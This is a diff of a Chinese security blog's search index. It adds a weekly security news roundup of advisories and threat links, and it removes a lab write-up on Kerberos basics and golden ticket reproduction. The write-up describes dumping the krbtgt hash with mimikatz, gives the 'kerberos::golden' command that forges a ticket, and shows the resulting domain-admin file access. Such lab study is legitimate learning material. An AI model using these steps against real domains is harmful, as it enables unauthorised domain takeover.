+<h1 id="0x04-参考文章"><a href="#0x04-参考文章" class="headerlink" title="0x04 参考文章"></a>0x04 参考文章</h1><p><a href="https://cloud.tencent.com/developer/article/1596509">Windows认证 | 域认证</a></p>
+<p><a href="https://1sparrow.com/2018/02/19/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9B%B8%E5%85%B3/">域渗透相关</a></p>
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>域</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>安全快讯（2021.01.15～01.22）</title>
+    <url>/2021/01/22/%E5%AE%89%E5%85%A8%E5%BF%AB%E8%AE%AF%EF%BC%882021-01-15%EF%BD%9E01-22%EF%BC%89/</url>
+    <content><![CDATA[<p><img src="/2021/01/22/%E5%AE%89%E5%85%A8%E5%BF%AB%E8%AE%AF%EF%BC%882021-01-15%EF%BD%9E01-22%EF%BC%89/1.png" alt></p>
+<a id="more"></a>
+<h1 id="安全快讯（2021-01-15～01-22）"><a href="#安全快讯（2021-01-15～01-22）" class="headerlink" title="安全快讯（2021.01.15～01.22）"></a>安全快讯（2021.01.15～01.22）</h1><h2 id="漏洞通告"><a href="#漏洞通告" class="headerlink" title="漏洞通告"></a>漏洞通告</h2><ol>
+<li><p>JumpServer远程命令执行漏洞：</p>
+<p>由于 JumpServer 某些接口未做授权限制，攻击者可构造恶意请求获取敏感信息，或者执行相关操作控制其中所有机器，执行任意命令。</p>
+<p>受影响的用户尽快升级 JumpServer 至最新版本。官方修复方案文档：</p>
+<p><a href="https://github.com/jumpserver/jumpserver/blob/master/README.md">https://github.com/jumpserver/jumpserver/blob/master/README.md</a></p>
+</li>
+<li><p>Apache Tomcat信息泄露：</p>
+<p>使用NTFS文件系统从网络位置提供资源时，可以绕过安全性约束或查看在某些配置中JSP的源代码。</p>
+<p>影响版本：10.0.0-M1至10.0.0-M9、9.0.0.0.M1至9.0.39、8.5.0至8.5.59和7.0.0至7.0.106</p>
+<p>受影响的用户尽快升级到更高版本，官网下载地址：</p>
+<p><a href="http://tomcat.apache.org/">http://tomcat.apache.org/</a></p>
+</li>
+<li><p>GitLab拒绝服务：</p>
+<p>攻击者可以通过发送格式错误的HTTP请求，在GitLab 13.7+中导致Prometheus拒绝服务</p>
+<p>详细信息：</p>
+<p><a href="https://gitlab.com/gitlab-org/cves/-/blob/master/2021/CVE-2021-22166.json">https://gitlab.com/gitlab-org/cves/-/blob/master/2021/CVE-2021-22166.json</a></p>
+</li>
+<li><p>windows10拒绝服务及NTFS 漏洞</p>
+</li>
+<li><p>Oracle 发布2021年1月关键补丁：</p>
+<p>共修复了329个不同程度的漏洞，此次安全更新涉及Oracle WebLogic Server、Oracle Database Server、Oracle Java SE、Oracle Fusion Middleware、Oracle MySQL、Oracle Enterprise Manager、Oracle Systems等多个常用产品。</p>
+<p>Oracle官方补丁需要用户持有正版软件的许可账号，使用该账号登陆<a href="https://support.oracle.com后，可以下载最新补丁。">https://support.oracle.com后，可以下载最新补丁。</a></p>
+</li>
+<li><p>Dnsmasq 软件多个高危漏洞：</p>
+<p>Dnsmasq 软件提供DNS 缓存和DHCP 服务功能。攻击者利用漏洞，可造成域名劫持、流量劫持、拒绝服务等，在启用DNSSEC的情况下甚至导致远程代码执行。影响版本：Dnsmasq &lt;2.83</p>
+<p>根据发行版包管理器及时安装升级并重启Dnsmasq软件</p>
+</li>
+<li><p>Drupal 目录遍历漏洞：</p>
+<p>Drupal是使用PHP语言编写的开源内容管理框架。使用了PEAR Archive_Tar作为依赖库，在处理如.tar、.tar.gz、.bz2或.tlz等格式的压缩包时，由于过滤不严，攻击者可构造包含符号链接的压缩包，结合上传功能，可能导致存在目录遍历漏洞，甚至远程代码执行漏洞。 </p>
+<p>升级Drupal至最新版本：</p>
+<p><a href="https://www.drupal.org/project/drupal/issues/3193801">https://www.drupal.org/project/drupal/issues/3193801</a></p>
+</li>
+</ol>
+<h2 id="恶意代码"><a href="#恶意代码" class="headerlink" title="恶意代码"></a>恶意代码</h2><ol>
+<li><p>针对巴西中央银行的实时钓鱼工具包：</p>
+<p><a href="https://blog.sucuri.net/2021/01/real-time-phishing-kit-targets-brazilian-central-bank.html">https://blog.sucuri.net/2021/01/real-time-phishing-kit-targets-brazilian-central-bank.html</a></p>
+</li>
+<li><p>勒索软件攻击了苏格兰环境保护局</p>
+<p><a href="https://www.databreachtoday.com/ransomware-disrupts-scottish-environment-protection-agency-a-15768">https://www.databreachtoday.com/ransomware-disrupts-scottish-environment-protection-agency-a-15768</a></p>
+</li>
+<li><p>Sysrv-hello僵尸网络集木马、后门、蠕虫于一身，攻击Linux、Windows主机挖矿：</p>
+<p><a href="https://mp.weixin.qq.com/s?__biz=MzI5ODk3OTM1Ng==&amp;mid=2247497474&amp;idx=1&amp;sn=87eb580380ee3ff5efd389da419f82c9">https://mp.weixin.qq.com/s?__biz=MzI5ODk3OTM1Ng==&amp;mid=2247497474&amp;idx=1&amp;sn=87eb580380ee3ff5efd389da419f82c9</a></p>
+</li>
+</ol>
+<h2 id="威胁情报"><a href="#威胁情报" class="headerlink" title="威胁情报"></a>威胁情报</h2><ol>
+<li><p>ESET发现针对哥伦比亚政府机构和企业的Spalax行动：</p>
+<p><a href="https://securityaffairs.co/wordpress/113429/hacking/operation-spalax-malware.html">https://securityaffairs.co/wordpress/113429/hacking/operation-spalax-malware.html</a></p>
+</li>
+<li><p>OpenWRT项目论坛被攻击，论坛用户信息被窃取：</p>
+<p><a href="https://www.zdnet.com/article/openwrt-reports-data-breach-after-hacker-gained-access-to-forum-admin-account/">https://www.zdnet.com/article/openwrt-reports-data-breach-after-hacker-gained-access-to-forum-admin-account/</a></p>
+</li>
+<li><p>NVIDIA Gamers面临DoS，Shield TV Bug导致的数据丢失：</p>
+<p><a href="https://threatpost.com/nvidia-gamers-dos-data-loss-shield-tv-bugs/163200/">https://threatpost.com/nvidia-gamers-dos-data-loss-shield-tv-bugs/163200/</a></p>
+</li>
+<li><p>黑客泄露了7700万个Nitro PDF用户记录的完整数据库；</p>
+<p><a href="https://www.bleepingcomputer.com/news/security/hacker-leaks-full-database-of-77-million-nitro-pdf-user-records/">https://www.bleepingcomputer.com/news/security/hacker-leaks-full-database-of-77-million-nitro-pdf-user-records/</a></p>
+</li>
+<li><p>The Signal、脸书和谷歌聊天应用漏洞，能让攻击者监视用户：</p>
+<p><a href="https://www.cnbeta.com/articles/tech/1080233.htm">https://www.cnbeta.com/articles/tech/1080233.htm</a></p>
+</li>
+</ol>
+<h2 id="其他资讯"><a href="#其他资讯" class="headerlink" title="其他资讯"></a>其他资讯</h2><ol>
+<li><p>QQ，Tim读取浏览器历史记录：</p>
+<p><a href="https://bbs.pediy.com/thread-265359.htm">https://bbs.pediy.com/thread-265359.htm</a></p>
+</li>
+<li><p>Flash停用致沈阳铁路局下属站段系统瘫痪，铁路信息化建设亟待加强；</p>
+<p><a href="https://baijiahao.baidu.com/s?id=1689006506064860761&amp;wfr=spider&amp;for=pc">https://baijiahao.baidu.com/s?id=1689006506064860761&amp;wfr=spider&amp;for=pc</a></p>
+</li>
+<li><p>多个 Linux 发行版考虑移除 Chromium 软件包：</p>
+<p><a href="https://www.solidot.org/story?sid=66710">https://www.solidot.org/story?sid=66710</a></p>
+</li>
+<li><p>RHEL将对小企业免费：</p>
+<p><a href="https://www.solidot.org/story?sid=66719">https://www.solidot.org/story?sid=66719</a></p>
+</li>
+<li><p>报告显示五分之一公司承认对远程员工进行秘密监视；</p>
+<p><a href="https://www.cnbeta.com/articles/tech/1080073.htm">https://www.cnbeta.com/articles/tech/1080073.htm</a></p>
+</li>
+<li><p>德国笔记本电脑零售商因视频监控员工而受到GDPR罚款1,040万欧元：</p>
+<p><a href="https://securityaffairs.co/wordpress/113560/digital-id/german-retailer-gdpr-fine.html">https://securityaffairs.co/wordpress/113560/digital-id/german-retailer-gdpr-fine.html</a></p>
+</li>
+</ol>
+<p><strong>【以上信息均来自互联网，若有侵权，留言删除】</strong></p>
+]]></content>
+      <categories>
+        <category>每周安全资讯</category>
+      </categories>
+      <tags>
+        <tag>网络情报</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>任意文件读取</title>
     <url>/2020/12/15/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/</url>
     <content><![CDATA[<h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>忙于换工作，又不知道写啥，又弃更了一段时间，看了Nu1l战队编写的从0到1 CTFER成长之路，于是记录下任意文件读取来凑个数吧。</p>
@@ -4887,87 +5063,6 @@ Dec[En(a)⊙En(b)]=a⊕b</script><p>En加密运算，Dec解密运算，当$⊕$�
       </categories>
       <tags>
         <tag>文件读取</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>域基础及黄金票据复现</title>
-    <url>/2021/01/18/%E5%9F%9F%E5%9F%BA%E7%A1%80%E5%8F%8A%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>啥都不说，做合规工作，偶尔更新一下。新年第一个博客，就简单写一下这几天复现的经典域环境中的黄金票据问题吧。</p>
-<h1 id="0x01-域环境搭建"><a href="#0x01-域环境搭建" class="headerlink" title="0x01 域环境搭建"></a>0x01 域环境搭建</h1><p>虚拟机安装，网卡设置仅主机模式。</p>
-<p>域控机器：windows service2016</p>
-<p>客户端：Windows10</p>
-<p><em>其中域控机器的DNS与IP一致，客户端DNS设置为域控机器的IP。</em></p>
-<a id="more"></a>
-<p>系统安装过程省略。</p>
-<p>在使用win10客户端加入域控时，出现大致<strong>如下错误：</strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;DNS 服务器失败。&quot;</span><br><span class="line"> (错误代码 0x0000232A RCODE_SERVER_FAILURE)</span><br><span class="line"></span><br><span class="line">此查询用于查找 _ldap._tcp.dc._msdcs.throld.com 的 SRV 记录</span><br></pre></td></tr></table></figure>
-<p>此时在DNS管理器中缺少_ldap的记录。（以下为修复后出现_ldap记录）</p>
-<p><img src="/2021/01/18/%E5%9F%9F%E5%9F%BA%E7%A1%80%E5%8F%8A%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%A4%8D%E7%8E%B0/ldap记录.png" alt></p>
-<p><strong>解决方案：</strong></p>
-<p><img src="/2021/01/18/%E5%9F%9F%E5%9F%BA%E7%A1%80%E5%8F%8A%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%A4%8D%E7%8E%B0/加域解决.png" alt></p>
-<p>此外，本人还重启了DNS服务，域环境搭建完成。</p>
-<h1 id="0x02-Kerberos认证"><a href="#0x02-Kerberos认证" class="headerlink" title="0x02 Kerberos认证"></a>0x02 Kerberos认证</h1><p>域内认证即采用了Kerberos协议的认证机制，其设计目标是通过密钥系统为客 户机 / 服务器应用程序提供强大的认证服务。该认证过程的实现不 依赖于主机操作系统的认证，无需基于主机地址的信任，不要求 网络上所有主机的物理安全，并假定网络上传送的数据包可以被 任意地读取、修改和插入数据。与本地认证和网络认证相比最大的区别是有个一个可信的第三方机构KDC的参与。</p>
-<p><strong>参与域认证的三个角色：</strong></p>
-<ul>
-<li>Client</li>
-<li>Server</li>
-<li>KDC(Key Distribution Center) = DC(Domain Controller)</li>
-</ul>
-<h2 id="Kerberos几个重要组件"><a href="#Kerberos几个重要组件" class="headerlink" title="Kerberos几个重要组件"></a>Kerberos几个重要组件</h2><p><strong>KDC：</strong></p>
-<p>KDC负责管理发放Ticket和记录授权的中心服务器，包含两部分：AS认证服务器（Authentication Server）,TGS服务授权服务器(Ticket Granting Server)</p>
-<ul>
-<li>Authentication Service：验证Client的身份，验证通过就会生成一个TGT (Ticket Granting Ticket) 给Client</li>
-<li>Ticket Granting Service： 为client用AS给予的TGT票据换取访问Server的ticket</li>
-</ul>
-<p><img src="/2021/01/18/%E5%9F%9F%E5%9F%BA%E7%A1%80%E5%8F%8A%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%A4%8D%E7%8E%B0/KDC.png" alt></p>
-<p><strong>其他重要组件：</strong></p>
-<ul>
-<li>AD（account database）：存储所有client的白名单，只有存在于白名单的client才能顺利申请到TGT</li>
-<li>Client 客户端：需要使用kerberos服务的客户端</li>
-<li>Server 服务端：提供具体服务的服务端</li>
-</ul>
-<h2 id="Kerberos认证流程"><a href="#Kerberos认证流程" class="headerlink" title="Kerberos认证流程"></a>Kerberos认证流程</h2><p>kerberos认证交互过程可以简要概括为以下图片中的三次通信：</p>
-<p><img src="/2021/01/18/%E5%9F%9F%E5%9F%BA%E7%A1%80%E5%8F%8A%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%A4%8D%E7%8E%B0/Kerberos.png" alt></p>
-<p><strong>粗略流程：</strong></p>
-<ol>
-<li>client先向DC请求，要求获取访问server的权限，当DC接收到请求之后，先由AS向AD发起请求，查看此client是否在白名单中，成功后，则由AS将TGT返回给client。 </li>
-<li>然后client带着TGT继续向DC发起请求，要求获取访问server的权限，当DC接收到请求后，TGS会通过TGT判断此client是否有获取server服务的权限，成功后，则将Ticket返回给client。</li>
-<li>最后client凭借Ticket去访问所请求的server，这个Ticket只对该server有效，如果要访问其他server，需要重新申请。 </li>
-</ol>
-<p>详细过程见：<a href="https://1sparrow.com/2018/02/18/Kerberos%E8%AE%A4%E8%AF%81%E7%9B%B8%E5%85%B3/">Kerberos认证相关</a></p>
-<h1 id="0x03-黄金票据复现"><a href="#0x03-黄金票据复现" class="headerlink" title="0x03 黄金票据复现"></a>0x03 黄金票据复现</h1><p>简义 : 在拥有普通域用户权限和 krbtgt账号的hash的情况下,获取域管理员权限。</p>
-<p>由来：</p>
-<blockquote>
-<p>Kerberos信任及完全依赖于KDC密码,由于Kerberos协议是无状态的,因此密钥分发中心KDC和票据授予服务TGS并没记录以前的交互信息。 因此票据授予服务所需使用的全部信息都位于TGT票据中。因为TGT使用krbtgt的密钥加密过, 理论上讲网络上只有两方能够解密TGT:</p>
-<p>​    颁发票据的KDC和接受票据并创建访问网络资源的服务票据的票据授予服务TGS。 </p>
-<p>这种情况让krbtgt成为系统中最重要的密码。最终结果是只要TGT被krbtgt账户密码正确地加密,TGT中的所有信息都是可信的。</p>
-</blockquote>
-<p><strong>复现流程：</strong>（以下操作均在win10客户端操作）</p>
-<ol>
-<li><p>提权到管理员用户，使用mimikatz导出krbtgt NTLM Hash</p>
-<p><img src="/2021/01/18/%E5%9F%9F%E5%9F%BA%E7%A1%80%E5%8F%8A%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%A4%8D%E7%8E%B0/hash.png" alt></p>
-</li>
-<li><p>生成黄金票据，在目录下生成了golden.ti票据文件</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kerberos::golden &#x2F;admin:administrator &#x2F;domain:domain-name &#x2F;sid:user-sid &#x2F;krbtgt:ntlmhash-value &#x2F;ticket:golden.ti</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/01/18/%E5%9F%9F%E5%9F%BA%E7%A1%80%E5%8F%8A%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%A4%8D%E7%8E%B0/生成票据.png" alt></p>
-<p>（<strong>注：</strong>SID复制时去掉最后的RID（502），不然生成的票据无法使用。）</p>
-</li>
-<li><p>此时使用普通用户打开mimikatz，导入golden.ti，低权限本地用户，就被提升到域管理权限。</p>
-<p><img src="/2021/01/18/%E5%9F%9F%E5%9F%BA%E7%A1%80%E5%8F%8A%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%A4%8D%E7%8E%B0/导入票据.png" alt></p>
-</li>
-<li><p>此时使用使用dir <a href="file:///ad.test.local/c$">\\ad.test.local\c$</a>查看文件夹可以访问，与之前对比：</p>
-<p><img src="/2021/01/18/%E5%9F%9F%E5%9F%BA%E7%A1%80%E5%8F%8A%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%A4%8D%E7%8E%B0/dir1.png" alt></p>
-<p><img src="/2021/01/18/%E5%9F%9F%E5%9F%BA%E7%A1%80%E5%8F%8A%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%A4%8D%E7%8E%B0/dir2.png" alt="dir2"></p>
-</li>
-</ol>
-<h1 id="0x04-参考文章"><a href="#0x04-参考文章" class="headerlink" title="0x04 参考文章"></a>0x04 参考文章</h1><p><a href="https://cloud.tencent.com/developer/article/1596509">Windows认证 | 域认证</a></p>
-<p><a href="https://1sparrow.com/2018/02/19/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9B%B8%E5%85%B3/">域渗透相关</a></p>
-]]></content>
-      <categories>
-        <category>渗透测试</category>
-      </categories>
-      <tags>
-        <tag>域</tag>
       </tags>
   </entry>
 </search>
